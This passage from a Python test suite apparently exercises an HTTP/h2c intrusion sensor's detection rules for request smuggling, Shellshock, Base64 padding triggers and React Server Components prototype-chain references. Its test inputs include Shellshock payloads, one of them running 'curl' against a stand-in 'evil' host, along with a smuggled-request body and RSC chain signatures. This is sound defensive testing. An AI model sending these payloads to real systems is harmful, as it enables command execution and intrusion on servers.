    st = hw.H2ConnectionState("f")
    block = (encode_literal(b":scheme", b"http") +
             encode_literal(b":path", b"/gnmi.gNMI/Subscribe") +
             encode_literal(b"content-type", b"application/grpc") +
             encode_literal(b"te", b"x"))
    out = st.feed([hw.H2Frame(0, hw.FRAME_HEADERS, hw.FLAG_END_HEADERS, 1, block)],
                  from_client=True, now=0.0)
    check("064: bad te fires", "HTTP-064" in codes(out))
    got60 = [x for x in out if x.code == "HTTP-060"]
    check("060: h2c posture reported", bool(got60))
    check("060: gNMI path raises severity to warn",
          got60 and got60[0].severity == hw.WARN)

    st2 = hw.H2ConnectionState("g")
    ok = (encode_literal(b":scheme", b"http") +
          encode_literal(b":path", b"/pkg.Svc/M") +
          encode_literal(b"content-type", b"application/grpc") +
          encode_literal(b"te", b"trailers"))
    out2 = st2.feed([hw.H2Frame(0, hw.FRAME_HEADERS, hw.FLAG_END_HEADERS, 1, ok)],
                    from_client=True, now=0.0)
    check("064: te: trailers silent", "HTTP-064" not in codes(out2))
    got60b = [x for x in out2 if x.code == "HTTP-060"]
    check("060: non-gNMI path stays info",
          got60b and got60b[0].severity == hw.INFO)

    st3 = hw.H2ConnectionState("h")
    bad_scheme = (encode_literal(b":scheme", b"ftp") +
                  encode_literal(b"content-type", b"application/grpc") +
                  encode_literal(b"te", b"trailers"))
    out3 = st3.feed([hw.H2Frame(0, hw.FRAME_HEADERS, hw.FLAG_END_HEADERS, 1,
                                bad_scheme)], from_client=True, now=0.0)
    check("064: bad :scheme fires", "HTTP-064" in codes(out3))

    st4 = hw.H2ConnectionState("i")
    creds = (encode_literal(b":path", b"/gnmi.gNMI/Get") +
             encode_literal(b"content-type", b"application/grpc") +
             encode_literal(b"te", b"trailers") +
             encode_literal(b"username", b"admin") +
             encode_literal(b"password", b"s3cr3t"))
    out4 = st4.feed([hw.H2Frame(0, hw.FRAME_HEADERS, hw.FLAG_END_HEADERS, 1,
                                creds)], from_client=True, now=0.0)
    got65 = [x for x in out4 if x.code == "HTTP-065"]
    check("065: gRPC metadata credentials fire", bool(got65))
    check("065: password not echoed",
          "s3cr3t" not in str([x.to_dict() for x in out4]))
    check("065: credential hashed",
          got65 and got65[0].evidence["credential"].startswith("sha256:"))

    st5 = hw.H2ConnectionState("j")
    nocred = (encode_literal(b":path", b"/pkg.Svc/M") +
              encode_literal(b"content-type", b"application/grpc") +
              encode_literal(b"te", b"trailers"))
    out5 = st5.feed([hw.H2Frame(0, hw.FRAME_HEADERS, hw.FLAG_END_HEADERS, 1,
                                nocred)], from_client=True, now=0.0)
    check("065: ordinary gRPC call silent", "HTTP-065" not in codes(out5))


# ===========================================================================
# flow engine
# ===========================================================================
def test_classification_and_flow():
    w = hw.HttpWatch()
    out = w.feed("f1", "10.0.0.1", "10.0.0.2", 80,
                 b"GET /x?password=zz HTTP/1.1\r\nHost: a\r\n\r\n", True, now=1.0)
    check("flow: http1 classified", w.flows["f1"].protocol == "http1")
    check("flow: finding surfaced through feed", "HTTP-044" in codes(out))

    w2 = hw.HttpWatch()
    w2.feed("f2", "10.0.0.1", "10.0.0.2", 50051, hw.H2_PREFACE, True, now=1.0)
    check("flow: h2c preface classified", w2.flows["f2"].protocol == "h2c")
    check("flow: preface consumed", bytes(w2.flows["f2"].c2s.buf) == b"")

    # port-agnostic: h2c on 80 is still h2c
    w3 = hw.HttpWatch()
    w3.feed("f3", "10.0.0.1", "10.0.0.2", 80, hw.H2_PREFACE, True, now=1.0)
    check("flow: h2c on port 80 detected (port-agnostic)",
          w3.flows["f3"].protocol == "h2c")

    # non-HTTP traffic is dropped, not buffered forever
    w4 = hw.HttpWatch()
    w4.feed("f4", "10.0.0.1", "10.0.0.2", 80, b"\x16\x03\x01" * 30000, True, now=1.0)
    check("flow: non-HTTP buffer dropped", len(w4.flows["f4"].c2s.buf) == 0)
    check("flow: non-HTTP stays unclassified", w4.flows["f4"].protocol is None)

    # a split preface must not be mistaken for HTTP/1
    w5 = hw.HttpWatch()
    w5.feed("f5", "10.0.0.1", "10.0.0.2", 80, hw.H2_PREFACE[:8], True, now=1.0)
    check("flow: partial preface held", w5.flows["f5"].protocol is None)
    w5.feed("f5", "10.0.0.1", "10.0.0.2", 80, hw.H2_PREFACE[8:], True, now=1.0)
    check("flow: preface completed across segments",
          w5.flows["f5"].protocol == "h2c")


def test_segmented_delivery():
    """A message split across TCP segments must parse identically."""
    raw = (b"POST /x HTTP/1.1\r\nHost: a\r\n"
           b"Range: bytes=0-18446744073709551615\r\n\r\n")
    whole = hw.HttpWatch()
    a = whole.feed("w", "1.1.1.1", "2.2.2.2", 80, raw, True, now=1.0)
    split = hw.HttpWatch()
    b = []
    for i in range(0, len(raw), 7):
        b += split.feed("s", "1.1.1.1", "2.2.2.2", 80, raw[i:i + 7], True, now=1.0)
    check("reassembly: byte-split delivery gives the same codes",
          sorted(codes(a)) == sorted(codes(b)))
    check("reassembly: finding still present", "HTTP-020" in codes(b))


def test_no_duplicate_analysis():
    """A head must be analysed once, not once per arriving segment.

    Regression: the first build re-ran every rule on each segment while a
    body was still arriving, so one slow POST reported the same finding
    dozens of times. No whole-message test could show it.
    """
    w = hw.HttpWatch()
    head = (b"POST /x HTTP/1.1\r\nHost: a\r\nContent-Type: "
            b"application/x-www-form-urlencoded\r\n"
            b"Content-Length: 26\r\n\r\n")
    out = w.feed("d", "1.1.1.1", "2.2.2.2", 80, head, True, now=1.0)
    for ch in b"user=admin&password=s3cr3t":
        out += w.feed("d", "1.1.1.1", "2.2.2.2", 80, bytes([ch]), True, now=1.0)
    check("dedupe: form password reported exactly once",
          codes(out).count("HTTP-041") == 1)
    check("dedupe: no finding repeated",
          len(codes(out)) == len(set(codes(out))))


def test_ambiguity_window():
    """Both framings must be observable at the same moment.

    Regression: the chunked terminator arrives before the bytes the
    Content-Length framer still claims, so consuming the message at the
    terminator threw away the smuggled bytes and HTTP-009 was lost under
    fine-grained delivery. Found by the scapy cross-check, pinned here.
    """
    smuggled = b"GET /admin HTTP/1.1\r\nHost: a\r\n\r\n"
    body = b"0\r\n\r\n" + smuggled
    raw = (b"POST /x HTTP/1.1\r\nHost: a\r\nContent-Length: " +
           str(len(body)).encode() + b"\r\nTransfer-Encoding: chunked\r\n\r\n" +
           body)

    def deliver(step):
        w = hw.HttpWatch()
        out = []
        for i in range(0, len(raw), step):
            out += w.feed("w", "1.1.1.1", "2.2.2.2", 80, raw[i:i + step],
                          True, now=1.0)
        return codes(out)

    for step in (1, 3, 17, 64, len(raw)):
        check(f"window: HTTP-009 survives {step}-byte segments",
              "HTTP-009" in deliver(step))

    # A Content-Length far past the chunked terminator is bogus, not a
    # window to wait in: the flow must not stall.
    big = (b"POST /x HTTP/1.1\r\nHost: a\r\nContent-Length: 99999999\r\n"
           b"Transfer-Encoding: chunked\r\n\r\n0\r\n\r\n")
    w = hw.HttpWatch()
    out = w.feed("big", "1.1.1.1", "2.2.2.2", 80, big, True, now=1.0)
    check("window: bogus oversized CL does not stall the flow",
          "HTTP-001" in codes(out))
    check("window: bogus CL consumed at the chunked terminator",
          len(w.flows["big"].c2s.buf) == 0)


def test_incomplete_body_still_reports_grammar():
    """An attacker who never finishes the body must still be reported.

    Regression found by the live lab: a chunk-size overflow with no
    terminating chunk was never analysed, because analysis waited for a
    complete message. The grammar violation is visible the moment the chunk
    line is read and waiting changes nothing.
    """
    w = hw.HttpWatch()
    raw = (b"POST /x HTTP/1.1\r\nHost: v\r\nTransfer-Encoding: chunked\r\n\r\n"
           + b"f" * 17 + b"\r\nA")
    out = w.feed("i", "1.1.1.1", "2.2.2.2", 80, raw, True, now=1.0)
    check("incomplete: chunk size overflow reported without a terminator",
          "HTTP-004" in codes(out))
    rest = w.feed("i", "1.1.1.1", "2.2.2.2", 80, b"\r\n0\r\n\r\n", True, now=1.0)
    check("incomplete: not reported a second time when the body lands",
          "HTTP-004" not in codes(rest))

    w2 = hw.HttpWatch()
    # the chunk LINE must be terminated before its extension can be read;
    # an unterminated line is not yet evidence of anything
    raw2 = (b"POST /x HTTP/1.1\r\nHost: v\r\nTransfer-Encoding: chunked\r\n\r\n"
            b'1;ext="val\r\nX\r\n')
    out2 = w2.feed("j", "1.1.1.1", "2.2.2.2", 80, raw2, True, now=1.0)
    check("incomplete: unclosed chunk extension reported early",
          "HTTP-005" in codes(out2))

    # a well-formed partial body must stay silent: arriving slowly is not
    # a defect
    w3 = hw.HttpWatch()
    raw3 = (b"POST /x HTTP/1.1\r\nHost: v\r\nTransfer-Encoding: chunked\r\n\r\n"
            b"4\r\nWik")
    out3 = w3.feed("k", "1.1.1.1", "2.2.2.2", 80, raw3, True, now=1.0)
    check("incomplete: a clean partial chunked body stays silent",
          not codes(out3))


def test_pipelined_requests():
    w = hw.HttpWatch()
    two = (b"GET /a HTTP/1.1\r\nHost: a\r\nContent-Length: 0\r\n\r\n"
           b"TRACE /b HTTP/1.1\r\nHost: a\r\nContent-Length: 0\r\n\r\n")
    out = w.feed("p", "1.1.1.1", "2.2.2.2", 80, two, True, now=1.0)
    check("pipelining: second message parsed", "HTTP-045" in codes(out))
    check("pipelining: buffer drained", len(w.flows["p"].c2s.buf) == 0)


def test_h2c_upgrade():
    w = hw.HttpWatch()
    w.feed("u", "1.1.1.1", "2.2.2.2", 80,
           b"GET / HTTP/1.1\r\nHost: a\r\nUpgrade: h2c\r\n"
           b"Connection: Upgrade, HTTP2-Settings\r\nHTTP2-Settings: AAMAAABk\r\n\r\n",
           True, now=1.0)
    w.feed("u", "1.1.1.1", "2.2.2.2", 80,
           b"HTTP/1.1 101 Switching Protocols\r\nUpgrade: h2c\r\n"
           b"Connection: Upgrade\r\n\r\n", False, now=1.0)
    check("h2c upgrade: flow handed to the Tier D parser",
          w.flows["u"].protocol == "h2c")
    check("h2c upgrade: h2 state created", w.flows["u"].h2 is not None)


def test_midstream_join():
    w = hw.HttpWatch()
    w.feed("m", "1.1.1.1", "2.2.2.2", 50051, hw.H2_PREFACE, True, now=1.0)
    w.join_midstream("m")
    st = w.flows["m"].h2
    check("midstream: connection marked unsynced", st.synced is False)
    check("midstream: client decoder unsynced", st.dec_client.synced is False)
    out = st.feed([hw.H2Frame(0, hw.FRAME_HEADERS, hw.FLAG_END_HEADERS, 1,
                              b"\xff\xff\xff")], from_client=True, now=1.0)
    check("midstream: header-content rules skipped, nothing guessed",
          "HTTP-063" not in codes(out) and "HTTP-064" not in codes(out))


def test_flow_expiry():
    w = hw.HttpWatch()
    w.feed("e", "1.1.1.1", "2.2.2.2", 80, b"GET / HTTP/1.1\r\nHost: a\r\n\r\n",
           True, now=1.0)
    w.expire(now=1.0 + hw.FLOW_IDLE_TIMEOUT - 1)
    check("expiry: live flow kept", "e" in w.flows)
    w.expire(now=1.0 + hw.FLOW_IDLE_TIMEOUT + 1)
    check("expiry: idle flow reaped", "e" not in w.flows)


# ===========================================================================
# registry integrity
# ===========================================================================
def test_state_is_reaped_without_being_asked():
    """A long-running sensor must not grow a Flow per connection forever.

    expire() existed from the start and nothing ever called it. Found while
    adding the HTTP-048 dedup table, which would have inherited the same
    leak. feed() now reaps on a timer, so every entry point gets it.
    """
    w = hw.HttpWatch()
    req = b"GET / HTTP/1.1\r\nHost: a\r\n\r\n"
    for i in range(50):
        w.feed(f"flow{i}", "10.0.0.1", "10.0.0.2", 80, req, True, now=1.0)
    check("expiry: flows accumulate while they are live", len(w.flows) == 50)
    # one packet, long after everything else went quiet
    w.feed("late", "10.0.0.1", "10.0.0.2", 80, req, True,
           now=1.0 + hw.FLOW_IDLE_TIMEOUT + hw.EXPIRE_INTERVAL + 1)
    check("expiry: idle flows reaped by feed() with no caller doing it",
          len(w.flows) == 1 and "late" in w.flows)

    # and the dedup table is reaped on the same timer
    w2 = hw.HttpWatch()
    leak = (b"HTTP/1.1 200 OK\r\nSet-Cookie: PHPSESSID=" + b"A" * 5000 +
            b"\r\nContent-Length: 0\r\n\r\n")
    for i in range(20):
        w2.feed(f"d{i}", "10.0.0.1", f"10.9.9.{i}", 80,
                b"GET / HTTP/1.1\r\nHost: a\r\n\r\n", True, now=1.0)
        w2.feed(f"d{i}", "10.0.0.1", f"10.9.9.{i}", 80, leak, False, now=1.0)
    check("expiry: a dedup entry per server while they are live",
          len(w2.leak_dedup._state) == 20)
    w2.feed("later", "10.0.0.1", "10.9.9.99", 80,
            b"GET / HTTP/1.1\r\nHost: a\r\n\r\n", True,
            now=1.0 + hw.PHP_DEDUP_WINDOW * 2 + 1)
    check("expiry: stale dedup entries reaped too",
          len(w2.leak_dedup._state) == 0)

    # reaping must not cost a finding on a flow that is still active
    w3 = hw.HttpWatch()
    for t in (1.0, 100.0, 200.0, 300.0):
        w3.feed("live", "10.0.0.1", "10.0.0.2", 80, req, True, now=t)
    check("expiry: an active flow survives every reap", "live" in w3.flows)


# ===========================================================================
# Tier E: HTTP-080 Shellshock, HTTP-081 Java4Shell
# ===========================================================================
def ereq(headers, line=b"GET /cgi-bin/x.sh HTTP/1.1"):
    return line + b"\r\n" + headers + b"\r\n"


def test_http_080_shellshock():
    # The load-bearing claim, measured on bash 5.2.21 through the patch-27
    # BASH_FUNC_name%% import path (same STREQN check in variables.c). The
    # table is pinned here so a relaxed prefix cannot pass quietly.
    # Two things have to be kept apart, and the measurement shows why.
    # The PREFIX CHECK is STREQN("() {", value, 4) and is all this rule
    # keys on. A successful IMPORT additionally needs the body after the
    # prefix to parse as a function. '() {echo X; }' passes the prefix and
    # fails the parse, so bash does not import it - but a header value
    # beginning with those four bytes still has no legitimate form, and an
    # attacker sending a malformed body is still attempting Shellshock. The
    # rule therefore fires on the prefix, which is the part with no
    # latitude, and does not try to predict the parse.
    PREFIX_PRESENT = [
        b"() { echo X; }",                  # imports on bash 5.2.21
        b"() { echo X;}",                   # imports
        b"() { :;}; /bin/id",               # imports
        b"() { _; } >_[$($())] { echo X; }",  # the 6278 shape
        b"() {echo X; }",                   # prefix yes, body fails to parse
    ]
    PREFIX_ABSENT = [
        b"(){ echo X; }",                   # no space: prefix differs
        b"()  { echo X; }",                 # two spaces: prefix differs
        b"(] { echo X; }",
        b"(){:;};echo",
        b"{ echo X; }",
        b"() ( echo X )",
        b"()",
        b"(",
    ]
    for value in PREFIX_PRESENT:
        out = run1(ereq(b"Host: v\r\nUser-Agent: " + value + b"\r\n"))
        check(f"HTTP-080: fires when the prefix is present {value[:18]!r}",
              "HTTP-080" in codes(out))
    for value in PREFIX_ABSENT:
        out = run1(ereq(b"Host: v\r\nUser-Agent: " + value + b"\r\n"))
        check(f"HTTP-080: silent when the prefix differs {value[:18]!r}",
              "HTTP-080" not in codes(out))

    # Leading OWS is a POSITIVE, not a negative, and the reason is the
    # layering. In a shell, ' () { ...' does not import: the value starts
    # with a space. Over HTTP that space is OWS, which RFC 9110 excludes
    # from the field value, so what CGI puts in HTTP_USER_AGENT begins at
    # the parenthesis and does import. Trimming first is mirroring the
    # server, not being lax.
    out = run1(ereq(b"Host: v\r\nUser-Agent:  () { :;}; id\r\n"))
    check("HTTP-080: leading OWS is stripped by the server, so it fires",
          "HTTP-080" in codes(out))

    # CGI exports every header, so the rule is scoped to every header.
    for field in (b"User-Agent", b"Cookie", b"Referer", b"X-Custom-Thing",
                  b"Accept-Language", b"From"):
        out = run1(ereq(b"Host: v\r\n" + field + b": () { :;}; id\r\n"))
        check(f"HTTP-080: covers {field.decode()}", "HTTP-080" in codes(out))

    # OWS is trimmed before the prefix test (RFC 9110 5.1).
    out = run1(ereq(b"Host: v\r\nUser-Agent:  \t () { :;}; id\r\n"))
    check("HTTP-080: leading OWS trimmed before the prefix test",
          "HTTP-080" in codes(out))

    # obs-fold: a fold is a way to split the prefix over two lines, so the
    # value is unfolded first - and the fold is still reported separately.
    out = run1(ereq(b"Host: v\r\nX-A: ()\r\n { :;}; id\r\n"))
    check("HTTP-080: fires on a prefix split across an obs-fold",
          "HTTP-080" in codes(out))
    check("HTTP-080: the fold is still reported as HTTP-008",
          "HTTP-008" in codes(out))
    f = [x for x in out if x.code == "HTTP-080"][0]
    check("HTTP-080: records that the value arrived folded",
          f.evidence["obs_folded"] is True)

    # The field-based entry point is what the h2c path uses, and it does
    # its own OWS trim because an HPACK value arrives without going through
    # parse_message. Tested directly, since parse_message would otherwise
    # hide whether the trim is there at all.
    for value in (b" () { :;}; id", b"\t() { :;}; id", b"  () { :;}; id"):
        got = hw.check_shellshock_fields([(b"user-agent", value)])
        check(f"HTTP-080: the field-level OWS trim handles {value[:6]!r}",
              len(got) == 1)
    check("HTTP-080: and an untrimmed non-prefix value still does not fire",
          not hw.check_shellshock_fields([(b"user-agent", b" (){ :;}; id")]))

    # mid-value is not a finding: bash imports on the prefix only
    out = run1(ereq(b"Host: v\r\nUser-Agent: Mozilla () { :;}; id\r\n"))
    check("HTTP-080: silent when the prefix is mid-value",
          "HTTP-080" not in codes(out))

    # a real browser and curl corpus
    for ua in (b"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, "
               b"like Gecko) Chrome/141.0 Safari/537.36",
               b"curl/8.5.0", b"Wget/1.21.4", b"python-requests/2.32.3",
               b"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)"):
        out = run1(ereq(b"Host: v\r\nUser-Agent: " + ua + b"\r\n"))
        check(f"HTTP-080: silent on {ua[:18].decode()!r}",
              "HTTP-080" not in codes(out))
    for value in (b'{"a": [1,2], "b": "() {"}', b"(a) { b }", b"() [ x ]",
                  b"f() { return 1; }", b"a=() { x"):
        out = run1(ereq(b"Host: v\r\nX-Meta: " + value + b"\r\n"))
        check(f"HTTP-080: silent on benign {value[:14]!r}",
              "HTTP-080" not in codes(out))

    # variant marker, and the payload gate
    out = run1(ereq(b"Host: v\r\nX-A: () { _; } >_[$($())] { id; }\r\n"))
    f = [x for x in out if x.code == "HTTP-080"][0]
    check("HTTP-080: 6278 shape recorded as a variant",
          f.evidence["variant"] == "6278_redir_shape")
    out = run1(ereq(b"Host: v\r\nX-A: () { :;}; curl http://evil/x\r\n"))
    f = [x for x in out if x.code == "HTTP-080"][0]
    check("HTTP-080: attack payload NOT logged by default",
          "payload" not in f.evidence and "evil" not in repr(f.evidence))
    check("HTTP-080: a digest is carried instead",
          f.evidence["value_digest"].startswith("sha256:"))
    msg = hw.parse_message(ereq(b"Host: v\r\nX-A: () { :;}; curl http://evil/x\r\n"),
                           "request")
    opted = hw.analyse_http1_message(
        msg, b"", cfg=hw.WatchConfig(log_attack_payload=True))
    f2 = [x for x in opted if x.code == "HTTP-080"][0]
    check("HTTP-080: payload appears only when explicitly opted in",
          "payload" in f2.evidence and "evil" in f2.evidence["payload"])


def test_http_081_java4shell():
    def auth(creds, scheme=b"Basic", field=b"Authorization"):
        return ereq(b"Host: v\r\n" + field + b": " + scheme + b" " + creds + b"\r\n")

    # Every published tail shape, after a whole 64-byte block and after the
    # 128 JDK 17 needs.
    for block in (64, 128):
        for tail in (b"=", b"==", b"X=", b"X==", b"XY=", b"==="):
            out = run1(auth(b"A" * block + tail))
            check(f"HTTP-081: fires on {block}+{tail.decode()!r}",
                  "HTTP-081" in codes(out))

    # Both sides of the length boundary.
    check("HTTP-081: the floor is the intrinsic block size",
          hw.JAVA4SHELL_MIN_CORE == 64)
    # Both sides of the floor, with a value that genuinely violates the
    # padding rules on each side - otherwise the case says nothing about
    # the floor, which is how a dropped floor escaped the bite tier.
    for core in (1, 8, 32, 62, 63):
        value = b"A" * core + b"="        # core not a multiple of 4 - 1
        info = hw.base64_padding_violations(value)
        if not info["violations"]:
            value = b"A" * core + b"=="   # make sure it does violate
            info = hw.base64_padding_violations(value)
        check(f"HTTP-081: the {core}-char probe really is malformed",
              bool(info["violations"]))
        check(f"HTTP-081: silent at core length {core}, below the floor",
              "HTTP-081" not in codes(run1(auth(value))))
    out = run1(auth(b"A" * 64 + b"="))
    check("HTTP-081: fires at the floor", "HTTP-081" in codes(out))
    out = run1(auth(b"A" * 65 + b"="))
    check("HTTP-081: fires above the floor", "HTTP-081" in codes(out))

    # RFC 4648 negatives: a valid encoding is never flagged, at any length.
    import base64 as _b64
    for n in range(1, 400, 7):
        enc = _b64.b64encode(b"u" * n)
        out = run1(auth(enc))
        if "HTTP-081" in codes(out):
            check(f"HTTP-081: silent on a valid encoding of {n} bytes", False)
            break
    else:
        check("HTTP-081: silent on every valid encoding from 1 to 400 bytes",
              True)
    # unpadded Base64 is legitimate at ANY length and carries no '='
    for n in (64, 65, 100, 1024):
        out = run1(auth(b"A" * n))
        check(f"HTTP-081: silent on unpadded Base64 of {n} chars",
              "HTTP-081" not in codes(out))
    # a length that IS a multiple of four with a legal trailing run
    out = run1(auth(b"A" * 66 + b"=="))
    check("HTTP-081: silent when length is a multiple of 4 and padding legal",
          "HTTP-081" not in codes(out))

    # base64url characters are a client bug, not the trigger shape
    out = run1(auth(b"A" * 62 + b"-_" + b"="))
    check("HTTP-081: silent on base64url characters",
          "HTTP-081" not in codes(out))
    out = run1(auth(b"A" * 64 + b"!" + b"="))
    check("HTTP-081: silent on characters outside the alphabet",
          "HTTP-081" not in codes(out))

    # scheme scope: RFC 7617 Basic and RFC 4559 Negotiate, case-insensitive
    for scheme in (b"Basic", b"basic", b"BASIC", b"BaSiC", b"Negotiate",
                   b"negotiate"):
        out = run1(auth(b"A" * 64 + b"=", scheme=scheme))
        check(f"HTTP-081: covers scheme {scheme.decode()}",
              "HTTP-081" in codes(out))
    for scheme in (b"Bearer", b"Digest", b"NTLM", b"AWS4-HMAC-SHA256"):
        out = run1(auth(b"A" * 64 + b"=", scheme=scheme))
        check(f"HTTP-081: out of scope for {scheme.decode()}",
              "HTTP-081" not in codes(out))
    out = run1(auth(b"A" * 64 + b"=", field=b"Proxy-Authorization"))
    check("HTTP-081: covers Proxy-Authorization", "HTTP-081" in codes(out))
    out = run1(auth(b"A" * 64 + b"=", field=b"X-Authorization"))
    check("HTTP-081: does not cover an unrelated header",
          "HTTP-081" not in codes(out))

    # violation classification, and the evidence discipline
    out = run1(auth(b"A" * 64 + b"="))
    f = [x for x in out if x.code == "HTTP-081"][0]
    check("HTTP-081: a non-multiple-of-4 length is classified",
          "len_mod4" in f.evidence["violations"])
    out = run1(auth(b"A" * 64 + b"===="))
    f = [x for x in out if x.code == "HTTP-081"][0]
    check("HTTP-081: an over-long padding run is classified",
          "pad_run" in f.evidence["violations"])
    out = run1(auth(b"A" * 32 + b"=" + b"A" * 31 + b"AAA="))
    f = [x for x in out if x.code == "HTTP-081"][0]
    check("HTTP-081: an inner '=' is classified",
          "inner_pad" in f.evidence["violations"])
    secret = b"c3VwZXJzZWNyZXRjcmVkZW50aWFs" + b"A" * 40 + b"="
    out = run1(auth(secret))
    f = [x for x in out if x.code == "HTTP-081"][0]
    check("HTTP-081: the credentials value is never logged",
          secret.decode() not in repr(f.evidence)
          and secret[:12].decode() not in repr(f.evidence))
    check("HTTP-081: a digest is carried instead",
          f.evidence["value_digest"] == hw.redact(secret))
    check("HTTP-081: says trigger-shaped, never vulnerable",
          "not on the wire" in f.evidence["note"]
          and "Trigger-shaped" in f.evidence["note"])


# ===========================================================================
# Tier F: HTTP-082 React2Shell, HTTP-083 Spring4Shell
# ===========================================================================
# Real encodeReply output, react-server-dom-webpack 19.0.0 / 19.0.1 /
# 19.1.1 / 19.1.2 / 19.2.0 / 19.2.1 (affected AND patched releases).
# Captured 2026-11-22. Every one of these must stay silent: a
# legitimate encoder emits no property-path reference, which is the
# whole basis of HTTP-082.
RSC_NEGATIVE_CORPUS = [
    ('primitives', '<string>', '[1,"two",true,null,"$-0",1e+308]'),
    ('nested-object', '<string>', '{"user":{"address":{"city":"Brooklyn","zip":"11235"}}}'),
    ('array-of-objects', '<string>', '[{"id":1,"name":"a"},{"id":2,"name":"b"}]'),
    ('own-key-constructor', '<string>', '{"constructor":"not a function","other":1}'),
    ('own-key-prototype', '<string>', '{"prototype":"plain string"}'),
    ('own-key-then', '<string>', '{"then":"a string called then"}'),
    ('own-key-proto-json', '<string>', '{"__proto__":{"x":1},"safe":2}'),
    ('nested-own-keys', '<string>', '{"a":{"constructor":{"prototype":{"then":"deep"}}}}'),
    ('map', '1', '[["k1","v1"],["constructor","v2"]]'),
    ('set', '1', '["a","constructor","then"]'),
    ('date', '<string>', '"$D2026-11-22T22:00:00.000Z"'),
    ('bigint', '<string>', '["$n1","$n123456789012345678901234567890"]'),
    ('specials', '<string>', '["$NaN","$Infinity","$-Infinity","$undefined"]'),
    ('typed-array', '0', '"$o1"'),
    ('circular', '<string>', '{"name":"circular","self":"$0"}'),
    ('formdata', '1_field', 'value'),
    ('blob', '0', '"$B1"'),
    ('deep-nest', '<string>', '{"next":{"i":0,"next":{"i":1,"next":{"i":2,"next":{"i":3,"next":{"i":4,"next":{"i":5,"next":{"i":6,"next":{"i":7,"next":{"i":8,"next":{"i":9,"next":{"i":10,"next":{"i":11,"next":{"i":12,"next":{"i":13,"next":{"i":14,"nex'),
    ('long-strings', '<string>', '["xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'),
    ('escapes', '<string>', '["$$1","$$@0","$$B0","$$1:a:b","literal $ dollar"]'),
    ('promise', '0', '"$@1"'),
    ('dates-many', '<string>', '["$D1970-01-01T00:00:00.000Z","$D2026-11-22T22:00:00.000Z","$D2001-09-09T01:46:40.000Z"]'),
    ('date-in-object', '<string>', '{"created":"$D2026-06-01T12:34:56.789Z","by":"solarflere"}'),
    ('async-iterable', '0', '"$x1"'),
    ('url-and-colons', '<string>', '["https://example.com:8443/a:b","time 12:34:56","a:b:c"]'),
    ('server-reference', '1', '{"id":"abc123#default","bound":null}'),
]


# The published chain shapes, as path references. These are detection
# signatures, not a working chain: no module loader, no bound arguments and
# no command are present or needed - the path traversal is the finding.
RSC_CHAINS = {
    "proto_then": b'["$1:__proto__:then"]',
    "constructor_twice": b'["$1:constructor:constructor"]',
    # Trend Micro: the minimum viable chain needs neither __proto__ nor
    # prototype, and has only ONE constructor segment. A rule written as
    # "__proto__ or prototype, or constructor twice" misses exactly this.
    "then_constructor": b'["$1:then:constructor"]',
}

RSC_BOUNDARY = b"----WebKitFormBoundary7MA4YWxkTrZu0gW"


def rsc_request(fields, boundary=RSC_BOUNDARY, header=b"Next-Action: 7f3abc",
                eol=b"\r\n", preamble=b"", charset=None, close=True,
                chunked=False, ctype=None, method=b"POST"):
    body = preamble
    for name, value in fields:
        ct = (b"Content-Type: text/plain; charset=" + charset + eol
              ) if charset else b""
        body += (b"--" + boundary + eol +
                 b'Content-Disposition: form-data; name="' + name + b'"' + eol
                 + ct + eol + value + eol)
    if close:
        body += b"--" + boundary + b"--" + eol
    head = (method + b" /dashboard HTTP/1.1\r\nHost: app\r\n" + header
            + b"\r\n" + (ctype or
            b"Content-Type: multipart/form-data; boundary=" + boundary) + b"\r\n")
    if chunked:
        head += b"Transfer-Encoding: chunked\r\n\r\n"
        body = b"%x\r\n" % len(body) + body + b"\r\n0\r\n\r\n"
    else:
        head += b"Content-Length: " + str(len(body)).encode() + b"\r\n\r\n"
    return head + body


def test_http_082_negative_corpus():
    """The zero-FP proof, built from real encoders rather than asserted."""
    fired = []
    for label, key, value in RSC_NEGATIVE_CORPUS:
        name = b"0" if key == "<string>" else key.encode()
        out = run1(rsc_request([(name, value.encode())]))
        if "HTTP-082" in codes(out):
            fired.append(label)
    check("HTTP-082: silent on the whole measured encodeReply corpus",
          not fired)
    check("HTTP-082: the corpus is the measured one",
          len(RSC_NEGATIVE_CORPUS) >= 24)
    # the two cases that decided the rule's shape
    dates = [v for _, _, v in RSC_NEGATIVE_CORPUS if "$D" in v]
    check("HTTP-082: the corpus contains a Date reference, which has colons",
          any(":" in v for v in dates))
    esc = [v for _, _, v in RSC_NEGATIVE_CORPUS if "$$" in v]
    check("HTTP-082: the corpus contains a $$-escaped user string",
          bool(esc))
    # and the specific thing that escape protects: a user string that LOOKS
    # like a path reference reaches the wire doubled, so it cannot match.
    out = run1(rsc_request([(b"0", b'["$$1:then:constructor"]')]))
    check("HTTP-082: a $$-escaped user string is not a reference",
          "HTTP-082" not in codes(out))
    # own keys that share a name with an inherited property
    for key in (b"constructor", b"prototype", b"then", b"__proto__"):
        out = run1(rsc_request([(b"0", b'{"' + key + b'":"a plain value"}')]))
        check(f"HTTP-082: silent on an own key named {key.decode()}",
              "HTTP-082" not in codes(out))
    # ordinary strings full of colons
    for value in (b'["https://example.com:8443/a:b"]', b'["12:34:56"]',
                  b'["a:b:c"]', b'{"t":"2026-11-22T22:00:00Z"}'):
        out = run1(rsc_request([(b"0", value)]))
        check(f"HTTP-082: silent on colon-bearing data {value[:20]!r}",
              "HTTP-082" not in codes(out))
    # a non-RSC request is not even gated in
    out = run1(rsc_request([(b"x", b'["$1:then:constructor"]')],
                           header=b"X-Nothing: 1"))
    check("HTTP-082: a non-numbered field with no RSC header is not gated in",
          "HTTP-082" not in codes(out))
    out = run1(rsc_request([(b"0", RSC_CHAINS["then_constructor"])],
                           method=b"GET"))
    check("HTTP-082: GET is out of scope", "HTTP-082" not in codes(out))


def test_http_082_positives_and_evasions():
    for label, payload in RSC_CHAINS.items():
        out = run1(rsc_request([(b"0", payload)]))
        check(f"HTTP-082: fires on the {label} chain", "HTTP-082" in codes(out))
    # Every documented evasion flag, against the minimum viable chain.
    pay = RSC_CHAINS["then_constructor"]
    variants = {
        "lf_only": dict(eol=b"\n"),
